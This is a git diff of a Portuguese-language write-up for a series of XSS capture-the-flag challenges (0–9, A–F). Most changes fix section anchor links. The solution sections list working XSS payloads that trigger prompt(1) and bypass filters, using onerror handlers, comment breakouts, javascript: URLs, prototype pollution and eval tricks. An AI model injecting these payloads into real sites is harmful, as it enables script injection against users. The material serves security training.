@@ -56,7 +56,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 0º desafio](#🔹_0º-desafio)
+[Ir para a resolução do 0º desafio](#-0º-desafio)
 
 ### 🔹 Desafio 1 — Regex simples
 
@@ -75,7 +75,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 1º desafio](https://www.google.com/search?q=%231%C2%BA-desafio)
+[Ir para a resolução do 1º desafio](#-1º-desafio)
 
 ### 🔹 Desafio 2 — Bloqueio de `=` e `(`
 
@@ -93,7 +93,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 2º desafio](https://www.google.com/search?q=%232%C2%BA-desafio)
+[Ir para a resolução do 2º desafio](#-2º-desafio)
 
 ### 🔹 Desafio 3 — Comentários HTML
 
@@ -111,7 +111,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 3º desafio](https://www.google.com/search?q=%233%C2%BA-desafio)
+[Ir para a resolução do 3º desafio](#-3º-desafio)
 
 ### 🔹 Desafio 4 — Scripts externos (whitelist de domínio)
 
@@ -131,7 +131,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 4º desafio](https://www.google.com/search?q=%234%C2%BA-desafio)
+[Ir para a resolução do 4º desafio](#-4º-desafio)
 
 ### 🔹 Desafio 5 — Regex contra `>` e eventos
 
@@ -151,7 +151,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 5º desafio](https://www.google.com/search?q=%235%C2%BA-desafio)
+[Ir para a resolução do 5º desafio](#-5º-desafio)
 
 ### 🔹 Desafio 6 — Redirecionamento com formulário
 
@@ -196,7 +196,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 6º desafio](https://www.google.com/search?q=%236%C2%BA-desafio)
+[Ir para a resolução do 6º desafio](#-6º-desafio)
 
 ### 🔹 Desafio 7 — Segmentação com `#`
 
@@ -217,7 +217,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 7º desafio](https://www.google.com/search?q=%237%C2%BA-desafio)
+[Ir para a resolução do 7º desafio](#-7º-desafio)
 
 ### 🔹 Desafio 8 — Filtro de quebras de linha
 
@@ -238,7 +238,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 8º desafio](https://www.google.com/search?q=%238%C2%BA-desafio)
+[Ir para a resolução do 8º desafio](#-8º-desafio)
 
 ### 🔹 Desafio 9 — Incompleta
 
@@ -260,7 +260,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do 9º desafio](https://www.google.com/search?q=%239%C2%BA-desafio)
+[Ir para a resolução do 9º desafio](#-9º-desafio)
 
 ### 🔹 Desafio A — Bloqueio de `prompt` e `'`
 
@@ -280,7 +280,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do A desafio](https://www.google.com/search?q=%23a-desafio)
+[Ir para a resolução do A desafio](#-a-desafio)
 
 ### 🔹 Desafio B — Filtro de operadores
 
@@ -306,7 +306,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do B desafio](https://www.google.com/search?q=%23b-desafio)
+[Ir para a resolução do B desafio](#-b-desafio)
 
 ### 🔹 Desafio C — `encodeURIComponent` + filtro
 
@@ -326,7 +326,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do C desafio](https://www.google.com/search?q=%23c-desafio)
+[Ir para a resolução do C desafio](#-c-desafio)
 
 ### 🔹 Desafio D — Injeção em JSON / Prototype Pollution
 
@@ -370,7 +370,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do D desafio](https://www.google.com/search?q=%23d-desafio)
+[Ir para a resolução do D desafio](#-d-desafio)
 
 ### 🔹 Desafio E — Incompleta
 
@@ -392,7 +392,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do E desafio](https://www.google.com/search?q=%23e-desafio)
+[Ir para a resolução do E desafio](#-e-desafioh)
 
 ### 🔹 Desafio F — Segmentação + título limitado
 
@@ -414,7 +414,7 @@ function escape(input) {
 }
 ```
 
-[Ir para a resolução do F desafio](https://www.google.com/search?q=%23f-desafio)
+[Ir para a resolução do F desafio](#-f-desafio)
 
 ---
 
@@ -433,7 +433,7 @@ function escape(input) {
 - Esse trecho não aparece como texto na página, ele é interpretado como um **bloco de código JavaScript real** que roda no navegador de quem abre a página.
     
 
-[Ir para o desafio 0](https://www.google.com/search?q=%23desafio-0)
+[Ir para o desafio 0](#-desafio-0--básico)
 
 ### 🔹 1º desafio
 
@@ -443,7 +443,7 @@ function escape(input) {
 <img src="x" onerror="prompt(1)"
 ```
 
-[Ir para o desafio 1](https://www.google.com/search?q=%23desafio-1)
+[Ir para o desafio 1](#-desafio-1--regex-simples)
 
 ### 🔹 2º desafio
 
@@ -453,7 +453,7 @@ function escape(input) {
 <svg><script>prompt&#40;1)</script></b>
 ```
 
-[Ir para o desafio 2](https://www.google.com/search?q=%23desafio-2)
+[Ir para o desafio 2](#-desafio-2--bloqueio-de--e-)
 
 ### 🔹 3º desafio
 
@@ -463,13 +463,13 @@ function escape(input) {
 --!> <script>prompt(1)</script>
 ```
 
-[Ir para o desafio 3](https://www.google.com/search?q=%23desafio-3)
+[Ir para o desafio 3](#-desafio-3--comentários-html)
 
 ### 🔹 4º desafio
 
 **Resolução pendente.**
 
-[Ir para o desafio 4](https://www.google.com/search?q=%23desafio-4)
+[Ir para o desafio 4](#-desafio-4--scripts-externos-whitelist-de-domínio)
 
 ### 🔹 5º desafio
 
@@ -480,7 +480,7 @@ function escape(input) {
 ="prompt(1)
 ```
 
-[Ir para o desafio 5](https://www.google.com/search?q=%23desafio-5)
+[Ir para o desafio 5](#-desafio-5--regex-contra--e-eventos)
 
 ### 🔹 6º desafio
 
@@ -490,7 +490,7 @@ function escape(input) {
 javascript:prompt(1)#{"action":1}
 ```
 
-[Ir para o desafio 6](https://www.google.com/search?q=%23desafio-6)
+[Ir para o desafio 6](#-desafio-6--redirecionamento-com-formulário)
 
 ### 🔹 7º desafio
 
@@ -500,7 +500,7 @@ javascript:prompt(1)#{"action":1}
 "><svg/a=#"onload='/*#*/prompt(1)'
 ```
 
-[Ir para o desafio 7](https://www.google.com/search?q=%23desafio-7)
+[Ir para o desafio 7](#-desafio-7--segmentação-com-)
 
 ### 🔹 8º desafio
 
@@ -510,13 +510,13 @@ javascript:prompt(1)#{"action":1}
  prompt(1) -->
 ```
 
-[Ir para o desafio 8](https://www.google.com/search?q=%23desafio-8)
+[Ir para o desafio 8](#-desafio-8--filtro-de-quebras-de-linha)
 
 ### 🔹 9º desafio
 
 **Resolução pendente.**
 
-[Ir para o desafio 9](https://www.google.com/search?q=%23desafio-9)
+[Ir para o desafio 9](#-desafio-9--incompleta)
 
 ### 🔹 A desafio
 
@@ -528,7 +528,7 @@ Para ignorar a primeira expressão regular, basta usar uma aspa simples para div
 p'rompt(1)
 ```
 
-[Ir para o desafio A](https://www.google.com/search?q=%23a-desafio)
+[Ir para o desafio A](#-desafio-a--bloqueio-de-prompt-e-)
 
 ### 🔹 B desafio
 
@@ -540,7 +540,7 @@ O truque aqui é usar um operador alfanumérico — ou seja, um operador que nã
 "(prompt(1))in"
 ```
 
-[Ir para o desafio B](https://www.google.com/search?q=%23b-desafio)
+[Ir para o desafio B](#-desafio-b--filtro-de-operadores)
 
 ### 🔹 C desafio
 
@@ -550,7 +550,7 @@ O truque aqui é usar um operador alfanumérico — ou seja, um operador que nã
 eval(630038579..toString(30))(1)
 ```
 
-[Ir para o desafio C](https://www.google.com/search?q=%23c-desafio)
+[Ir para o desafio C](#-desafio-c--encodeuricomponent--filtro)
 
 ### 🔹 D desafio
 
@@ -560,13 +560,13 @@ eval(630038579..toString(30))(1)
 {"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
 ```
 
-[Ir para o desafio D](https://www.google.com/search?q=%23d-desafio)
+[Ir para o desafio D](#-desafio-c--encodeuricomponent--filtro)
 
 ### 🔹 E desafio
 
 **Resolução pendente.**
 
-[Ir para o desafio E](https://www.google.com/search?q=%23e-desafio)
+[Ir para o desafio E](#-desafio-e--incompleta)
 
 ### 🔹 F desafio
 
@@ -575,9 +575,11 @@ eval(630038579..toString(30))(1)
 Um truque que podemos usar aqui é usar comentários **HTML** `<script>prompt(1)</script>
 
 ```
+"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
 
-[Ir para o desafio F](#f-desafio)
 ```
+
+Ir para o desafio F](#-desafio-f--segmentação--título-limitado)
 ---
 
 ## ✅ Conclusão
